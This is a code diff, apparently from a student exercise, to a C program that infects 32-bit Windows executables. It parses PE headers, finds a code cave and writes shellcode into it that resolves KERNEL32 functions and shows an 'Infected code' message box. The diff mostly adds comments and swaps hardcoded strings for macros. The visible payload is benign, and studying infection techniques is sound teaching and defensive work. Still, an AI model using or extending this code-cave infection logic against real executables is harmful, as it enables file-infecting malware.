@@ -16,8 +16,8 @@ DWORD PositionOfSetMesBoxVersionInShellCode = POS_SET_MESBOX_VERSION_STABLE;
 DWORD PositionOfCallLoadLibInShellcode      = POS_CALL_LOAD_STABLE;
 DWORD PositionOfCallGetProcInShellcode      = POS_CALL_GET_PROC_STABLE;
 DWORD PositionOfJmp                         = POS_JMP_STABLE;
-UCHAR *Caption = "17520074 - 17520467";
-UCHAR *Text    = "Infected code";
+UCHAR *Caption = CAPTION_;
+UCHAR *Text    = TEXT_;
 
 int stableInfectMessageBox(
     UCHAR *FileName, 
@@ -38,12 +38,18 @@ int stableInfectMessageBox(
     fclose(FinHandle);
     fclose(FouHandle);
 
-    DWORD nBytesOfPlaceHold = 0x20;
+    // The number of place hold bytes
+    DWORD nBytesOfPlaceHold = 0x10;
+    // Position of set caption string
     DWORD OffsetOfCaption = (DWORD) endStableCode - (DWORD) stableCode + nBytesOfPlaceHold;
+    // Position of set text string
     DWORD OffsetOfText = OffsetOfCaption + strlen(Caption) * 2 + 2;
+    // Position of set dll name string
     DWORD OffsetOfDLLName = OffsetOfText + strlen(Text) * 2 + 2;
-    DWORD LengthOfShellcode = OffsetOfDLLName + strlen("KERNEL32.dll") * 2 + 0x10;
+    // Size of shellcode
+    DWORD LengthOfShellcode = OffsetOfDLLName + strlen("KERNEL32.dll") * 2 + nBytesOfPlaceHold;
 
+    // Read PE file header to extracting information
     IMAGE_DOS_HEADER DOSHeader;
     IMAGE_NT_HEADERS32 NTHeaders;
     IMAGE_SECTION_HEADER SectionHeaders[MAX_SECTIONS];
@@ -51,6 +57,7 @@ int stableInfectMessageBox(
     readPE32Header(FinHandle, &DOSHeader, &NTHeaders, SectionHeaders);
     fclose(FinHandle);
 
+    // Create some variable and struct to pass into function as a reference
     IMAGE_SECTION_HEADER WhereSection; // Section which will be infected with shellcode
     DWORD Length;   // Length of code cave
     DWORD Offset;   // Offset of code cave in file
@@ -150,6 +157,7 @@ int stableInfectMessageBox(
         remove(CurrentInputFileName);
         return 1;
     }
+
     // Copy shellcode to writable memory
     UCHAR *ShellCode = (UCHAR *) malloc(LengthOfShellcode);
     memset(ShellCode, 0, LengthOfShellcode);
@@ -247,7 +255,7 @@ int stableInfectMessageBox(
 }
 
 #endif
- 
+
 int main(int argc, char *argv[]){
     srand(time(NULL));
 
